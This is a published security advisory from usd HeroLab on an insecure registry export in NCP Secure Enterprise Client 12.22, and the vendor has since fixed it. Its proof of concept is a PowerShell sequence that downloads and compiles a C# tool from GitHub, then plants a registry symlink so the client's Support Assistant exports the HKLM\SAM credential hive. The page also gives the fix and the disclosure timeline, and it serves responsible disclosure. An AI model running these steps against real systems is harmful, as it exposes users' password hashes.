=== Content from herolab.usd.de_b5b8c436_20250114_235025.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2022-0005/ "Deutsch")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2022-0005/ "Deutsch")

# usd-2022-0005 | NCP Secure Enterprise Client - Insecure Registry Export

**Advisory ID:** usd-2022-0005
**Product:** NCP Secure Enterprise Client
**Affected Version:** 12.22
**Vulnerability Type:** Insecure Registry Export
**Security Risk:** High
**Vendor URL:** https://www.ncp-e.com/
**Vendor Status:** Fixed

### Introduction

The *Windows Registry* is a central storage location for configuration settings on the *Windows* operating system. Data that is stored
within the *Windows Registry* is utilized by several different components, like desktop applications, services, device drivers and also
the kernel itself. Several locations within the *Windows Registry* are known to contain sensitive information. The probably most well
known example is the **HKLM\SAM** hive, that stores hashed credentials of local user accounts.

The *NCP Secure Enterprise* client is a *VPN* and networking application that is utilized by many organisations to connect workstations
to the cooperate network. The client supports a *Support Assistant* feature, which allows low privileged user accounts to obtain diagnostic
information from the operating system. Within this diagnostic information, the *NCP Secure Enterprise* client also exports information
from the *Windows Registry*. During this export, *Registry symbolic links* are followed and may allow to redirect the export to an arbitrary
location within the *Windows Registry*.

For such an attack to work, a low privileged user accounts need to be able to create *Registry symbolic links* within the exported *Registry
keys*. In the case of the *NCP Secure Enterprise* client, this is possible, since the client exports all keys under **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\* *recursively. On a default installation of* Windows*, this* Registry key *usually contains some keys where low privileged user accounts
can create* subkeys*. Newly created* subkeys *are owned by the creating user and it is possible to create* Registry symbolic links *within them that point to arbitrary* Registry *locations. Since the* symlink\* originates from a trusted** HKLM **hive, it is not restricted
by* Microsoft's* protection features for *Registry symbolic links*.

### Proof of Concept

The first step is finding a *Registry key* within **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services** that is writable for low privileged
user accounts. Corresponding keys might vary for different installations, but on our test systems it was always possible to find at least
one such key. In the following we use the key **HKLM\System\CurrentControlSet\Services\vds\Alignment** which seems to be available and allows
the creation of *subkeys* on most installations.

Within this *Registry key* we now create a *symbolic link* pointing to **HKLM\SAM**

```
PS C:\> $code = (iwr https://raw.githubusercontent.com/usdAG/SharpLink/main/SharpLink.cs).content
PS C:\> Add-Type $code
PS C:\> [de.usd.SharpLink.RegistryLink]::CreateKey("HKLM\System\CurrentControlSet\Services\vds\Alignment\SUB")
[+] Creating registry key: HKLM\System\CurrentControlSet\Services\vds\Alignment\SUB
[+] Registry key was successfully created.
PS C:\> $r = New-Object de.usd.SharpLink.RegistryLink("HKLM\System\CurrentControlSet\Services\vds\Alignment\SUB\LINK", "HKLM\SAM")
PS C:\> $r.Open()
[+] Creating registry key: \Registry\Machine\System\CurrentControlSet\Services\vds\Alignment\SUB\LINK
[+] Assigning symlink property pointing to: \Registry\Machine\SAM
[+] RegistryLink setup successful!
```

After the *Registry symbolic link* is setup, one can start the *Support Assistant* using the *NCP Secure Enterprise* client tray icon
(upper right inside the *Help* menu). After the *Support Assistant* was started, it collects support information from the operating system:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2022/06/support-assistant-2.png)

The collected files can be viewed either from the *Support Assistant* directly or by inspecting them in **C:\Users\\AppData\Local\Temp\NcpSupport\*\*.
Within the** Services.reg **file, one can find the export of the** HKLM\SAM\*\* hive:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2022/06/sam-export.png)

### Fix

During the collection of support information from the operating system, the *NCP Secure Enterprise* client software should impersonate
the user that started the *Support Assistant*. This way, only information that the invoking user is allowed to read can be obtained.

### References

* https://www.ncp-e.com/
* https://github.com/usdAG/SharpLink

### Timeline

* **2022-02-02** First contact request via info-mv@ncp-e.com
* 2022-02-02 Advisory transfered to the vendor
* 2022-02-15 Vendor appreciates the submission of the advisories and begins to fix the identified vulnerabilities
* 2022-06-09 Responsible Disclosure Team requests an update
* 2022-06-21 Vendor annouces a new software release available in August
* 2022-08-31 NCP Secure Enterprise Client 13.10 is released
* 2023-03-03 This advisory is published

### Credits

These security vulnerabilities were found by Tobias Neitzel.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

#### [Contact](https://www.usd.de/en/contact/)

[Imprint](https://www.usd.de/en/imprint/)

[Privacy Protection](https://www.usd.de/en/privacy-protection/)

[General Terms and Conditions](https://www.usd.de/en/terms-conditions/)

© 2025 usd AG

#### Follow Us

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)     [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/showcase/usd-ag-international/)

[Report a vulnerability or bug](https://www.usd.de/en/report-a-vulnerability-or-bug/)

[Code of Ethics](/en/code-of-ethics/)

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/en/the-security-risks-of-overlong-utf-8-encodings/)

Sep 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories on hugocms and Gitea](https://herolab.usd.de/en/security-advisories-on-hugocms-and-gitea/)

Jul 25, 2024

The pentest professionals at usd HeroLab examined hugocms and Gitea during their pentests. Thereby, several vulnerabilities were identified. The vulnerabilities were reported to the vendors as part of the Responsible Disclosure Policy. The usd HeroLab Advisories can...

## [Security Advisory on AXIS Webcam](https://herolab.usd.de/en/security-advisory-on-axis-webcam/)

Jul 1, 2024

The pentest professionals at usd HeroLab examined the AXIS Webcam (P1364) during their pentests. Our professionals discovered a vulnerability (cross-site request forgery) in the admin panel of AXIS P1364 Webcam. Exploiting this vulnerability enables an attacker to...


